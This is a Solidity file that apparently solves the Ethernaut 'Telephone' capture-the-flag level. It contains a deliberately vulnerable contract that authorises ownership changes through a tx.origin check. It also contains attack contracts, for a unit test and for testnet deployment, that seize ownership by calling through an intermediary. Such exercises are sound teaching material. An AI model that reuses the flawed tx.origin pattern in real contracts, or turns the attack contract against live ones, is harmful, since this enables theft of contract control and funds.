// SPDX-License-Identifier: MIT

// exercise code updated for > 0.8.0 solc
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/phishing-with-tx-origin/
// claim ownership of vulnerable contract by calling changeOwner() through
// the attack contract
contract TelephoneAttack {
   Telephone telephone;

  constructor(address _telephone) {
    telephone =  Telephone(_telephone);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}


// solution used to deploy live to testnet
pragma solidity ^0.8.0;

// vulnerable contract stub with required function
contract TelephoneLive {
  function changeOwner(address _owner) public {}
}

// attack contract
contract TelephoneAttackLive {
  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address TELEPHONE_ADDRESS = 0xD95d07691c0081e422b529510feb51F554B010c2;

  TelephoneLive telephone;

  constructor() {
    telephone = TelephoneLive(TELEPHONE_ADDRESS);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}
